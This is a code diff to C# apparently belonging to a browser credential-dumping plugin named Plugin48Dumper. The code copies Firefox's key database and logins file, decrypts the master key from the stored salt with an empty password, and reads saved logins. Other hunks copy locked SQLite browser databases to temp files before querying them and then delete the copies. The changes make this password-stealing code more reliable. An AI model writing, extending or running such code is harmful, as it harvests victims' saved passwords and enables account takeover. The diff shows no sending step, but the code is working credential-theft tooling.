@@ -63,9 +63,11 @@ namespace Plugin48Dumper
 
                         SQLiteHandler sqlDatabase = new SQLiteHandler(userFireFoxdbPath_tempFile);
 
+                        clsTools.fnLogInfo("A");
+
                         if (sqlDatabase.ReadTable("metadata"))
                         {
-                            clsTools.fnLogInfo("OK");
+                            clsTools.fnLogInfo("B");
                             for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                             {
                                 if (sqlDatabase.GetValue(i, "id") != "password") continue;
@@ -83,19 +85,13 @@ namespace Plugin48Dumper
                         Asn1DerObject asn = asn1Der.Parse(dataToParse);
                         byte[] array = decryptPEB(asn, Encoding.ASCII.GetBytes(""), globalSalt);
 
-                        clsTools.fnLogInfo("OK");
-
                         Asn1DerObject asn2 = asn1Der.Parse(dataToParse2(userFireFoxdbPath_tempFile));
                         byte[] key = decryptPEB(asn2, Encoding.ASCII.GetBytes(""), globalSalt);
-
-                        clsTools.fnLogInfo("OK");
 
                         using (StreamReader streamReader = new StreamReader(userFireFoxloginPath_tempFile))
                         {
                             string value = streamReader.ReadToEnd();
                             dynamic jsonObject = JsonConvert.DeserializeObject<dynamic>(value);
-
-                            clsTools.fnLogInfo("OK");
 
                             var loginsArray = jsonObject["logins"];
 
@@ -137,6 +133,7 @@ namespace Plugin48Dumper
                                 }
                             }
                         }
+
                         File.Delete(userFireFoxdbPath_tempFile);
                         File.Delete(userFireFoxloginPath_tempFile);
                     }
@@ -165,7 +162,10 @@ namespace Plugin48Dumper
                 if (!File.Exists(szFilePath))
                     continue;
 
-                string szConnStr = fnConnString(szFilePath);
+                string szTempPath = fnNewTempFilePath();
+                File.Copy(szFilePath, szTempPath);
+
+                string szConnStr = fnConnString(szTempPath);
                 using (var conn = new SQLiteConnection(szConnStr))
                 {
                     conn.Open();
@@ -215,6 +215,8 @@ namespace Plugin48Dumper
                         }
                     }
                 }
+
+                File.Delete(szTempPath);
             }
 
             return ls;
@@ -233,7 +235,10 @@ namespace Plugin48Dumper
                 if (!File.Exists(szFilePath))
                     continue;
 
-                string szConnStr = fnConnString(szFilePath);
+                string szTempPath = fnNewTempFilePath();
+                File.Copy(szFilePath, szTempPath);
+
+                string szConnStr = fnConnString(szTempPath);
                 using (var conn = new SQLiteConnection(szConnStr))
                 {
                     conn.Open();
@@ -281,6 +286,8 @@ namespace Plugin48Dumper
                         }
                     }
                 }
+
+                File.Delete(szTempPath);
             }
 
             return ls;
